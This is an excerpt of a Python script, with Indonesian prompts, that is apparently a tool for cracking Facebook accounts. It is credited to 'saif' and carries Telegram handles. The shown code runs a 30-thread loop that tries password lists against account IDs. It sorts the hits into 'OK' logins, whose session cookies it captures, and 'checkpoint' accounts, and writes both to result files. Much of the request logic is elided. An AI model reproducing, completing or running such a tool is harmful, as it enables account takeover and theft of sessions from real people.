...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'[•] 1. Saif {h}OK{x} heder ')
	print(f'[•] 2. Saif {k}CP{x} heder ')
	print('[•] 3. Kembali	')
	kz = input(f'\n>> Pilih : ')
	if kz in ['2']:
		...
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			print('>> saif Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def crack_file():
	...
	if len(vin)==0:
		...
		if kontol in ['']:
			...
			print(f'\n[{k}x{x}] saif Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('>> saif Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
...
def passwrd():
	...
	print('')
	print(f'[•] saif {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'[•] saif {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] CRACK Fb by stand —> saif 😎[cyan] ✓[white] '))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}saif CP —>{k} {idf}|{pw}{N}')     
				...
				if 'no' in taplikasi:
					...
					print(f'\r{x}saif OK —> {H}{idf}|{pw}|{kuki}{N}')
...
if __name__=='__main__':
	...
	alvino_xy(f'\n\t{x}[=]——> {m}𝐂𝐨𝐝 𝐛𝐲 saif heder !!{x}<——[=]\n\t{x}[=]——> {m}𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦:@xisuz{x}<——[=]\n\t{x}[=]——> {m}𝐂𝐡𝐚𝐧𝐚𝐥:@suuid{x}<——[=]\n\t{x}[=]——> {m}FaceBook ....!!{x}<——[=]\n\t{x}[=]——> {m} ! لعيون لخماطه!{x}<——[=]{x}')
	time.sleep(3)
	login()
